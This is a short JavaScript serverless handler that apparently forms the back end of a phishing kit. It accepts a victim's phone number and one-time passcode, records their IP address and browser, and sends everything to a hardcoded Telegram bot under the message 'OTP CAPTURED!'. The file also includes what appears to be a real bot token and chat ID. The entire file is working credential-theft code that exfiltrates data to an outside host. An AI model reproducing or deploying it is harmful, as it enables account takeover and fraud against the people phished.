// /api/log.js
const { Telegraf } = require('telegraf');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { phone, otp } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const userAgent = req.headers['user-agent'];
        
        // Kirim ke bot Telegram
        const bot = new Telegraf('8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o');
        await bot.telegram.sendMessage(
            '7933552719',
            `✅ OTP CAPTURED!\n\n📱 Phone: ${phone}\n🔐 OTP: ${otp}\n📍 IP: ${ip}\n🌐 User Agent: ${userAgent}\n🕐 Time: ${new Date().toISOString()}`
        );
        
        res.status(200).json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Internal server error' });
    }
};